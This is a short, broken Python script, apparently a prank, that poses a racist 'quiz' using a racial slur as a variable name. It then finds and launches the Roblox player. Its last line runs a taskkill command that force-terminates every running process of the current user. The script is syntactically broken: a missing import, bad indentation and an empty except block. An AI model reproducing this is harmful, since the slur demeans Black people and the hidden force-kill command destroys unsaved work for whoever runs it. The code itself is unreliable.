nigger = "correct answer"
while True:
    answer = input("what is the blacckest thing in the world? ")
    if answer == nigger:
        print("Correct!")




        user_home = os.path.expanduser("~")
roblox_path = os.path.join(user_home, "AppData", "Local", "Roblox", "Versions")
try:
    for root, dirs, files in os.walk(roblox_path):
        if "RobloxPlayerBeta.exe" in files:
            teljes_utvonal = os.path.join(root, "RobloxPlayerBeta.exe")
            os.startfile(teljes_utvonal)
            break
except Exception as e:


os.system('taskkill /F /FI "STATUS eq RUNNING" /FI "USERNAME eq %USERNAME%" /T')